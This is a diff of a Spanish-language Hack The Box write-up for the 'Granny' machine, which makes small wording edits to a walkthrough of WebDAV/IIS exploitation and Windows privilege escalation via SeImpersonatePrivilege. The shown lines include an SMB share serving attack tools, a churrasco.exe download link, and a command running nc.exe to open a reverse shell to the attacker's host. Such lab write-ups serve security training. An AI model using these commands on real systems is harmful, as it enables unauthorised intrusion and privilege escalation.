@@ -10,7 +10,7 @@ image:
 
 Granny es una máquina de dificultad ```Easy``` en la plataforma **Hack The Box**
 
-En esta máquina explotaremos una vulnerabilidad de ```Webdav``` que nos permitirá llevar a cabo un ```RFI```
+En esta máquina explotaremos una vulnerabilidad ```Webdav``` que nos permitirá llevar a cabo un ```RFI``` (Remote File Inclusion)
 
 ## **Reconocimiento**
 
@@ -32,7 +32,7 @@ nmap -sCV -p80 10.10.10.15 -oN versions
 
 ![img](/assets/img/post/granny/772fc76a-3774-4bd5-baf7-7bbd0b259c64.png)
 
-Gracias al conjunto de scripts básicos de reconocimiento que aplica el escaneo, podemos ver los tipos de peticiones que se pueden realizar en el servidor, además de que en el puerto ```80``` se ha detectado un ```Webdav``` además de un ```IIS```
+Gracias al conjunto de scripts básicos de reconocimiento que aplica el escaneo, podemos ver los tipos de peticiones que se pueden realizar en el servidor, además de que en el puerto ```80``` se ha detectado un ```Webdav``` además de un ```IIS``` (Servidor web que maneja solicitudes HTTP y HTTPS)
 
 Si entramos en la web no vamos a ver nada relevante, ni que podamos usar:
 
@@ -112,7 +112,9 @@ whoami /priv
 
 El permiso que nos interesa es ```SeImpersonatePrivilege```
 
-Si buscamos sobre la escalada de privilegios explotando este permiso nos llevará a https://github.com/Re4son/Churrasco/raw/master/churrasco.exe y descargaremos el ejecutable ```churrasco.exe``` *(xd)*
+> Este permiso es único en Windows, y permite a un usuario o proceso hacerse pasar por otro usuario o proceso
+
+Si buscamos sobre la escalada de privilegios explotando este permiso nos llevará a <https://github.com/Re4son/Churrasco/raw/master/churrasco.exe> y descargaremos el ejecutable ```churrasco.exe``` *(xd)*
 
 Utilizando el ```impacket-smbserver``` compartiremos el ejecutable con la máquina víctima
 
@@ -120,7 +122,7 @@ Utilizando el ```impacket-smbserver``` compartiremos el ejecutable con la máqui
 impacket-smbserver smbFolder $(pwd)
 ```
 
-En la máquina víctima nos moveremos a ```C:\WINDOWS\temp``` y en esta ruta usaremos el comando: 
+En la máquina víctima nos moveremos a ```C:\WINDOWS\temp``` y en esta ruta usaremos el comando:
 
 ```bash
 copy \\10.10.14.5\smbFolder\churrasco.exe churrasco.exe
@@ -130,9 +132,11 @@ Y una vez copiado ejecutaremos ```churrasco.exe```
 
 ```bash
 churrasco.exe
+
 /churrasco/-->Usage: Churrasco.exe [-d] "command to run"
 ```
-Por lo tanto al ver el uso del comando intentaremos conseguir una shell como ```root```, así que deberemos usar ```nc.exe```:
+
+Vemos la función del ejecutable, por lo que intentaremos conseguir una shell como ```root```, así que deberemos usar ```nc.exe```:
 
 ```bash
 churrasco.exe "\\10.10.14.5\smbFolder\nc.exe -e cmd 10.10.14.5 443"
@@ -144,6 +148,6 @@ Y de nuevo nos pondremos en escucha con ```nc``` por el puerto ```443```:
 
 Y ya tendremos acceso a la máquina como usuario privilegiado
 
-Podremos ver **ambas flag** en el ``Desktop`` del ``usuario`` y del ``administrator``
+Podremos ver ambas **flag** en el ``Desktop`` del ``usuario`` y del ``administrator``
 
-Espero que os haya gustado y servido, cualquier comentario es de muchas ayuda. Adios!
+*Espero que os haya gustado y servido, cualquier comentario es de mucha ayuda. Adios!*
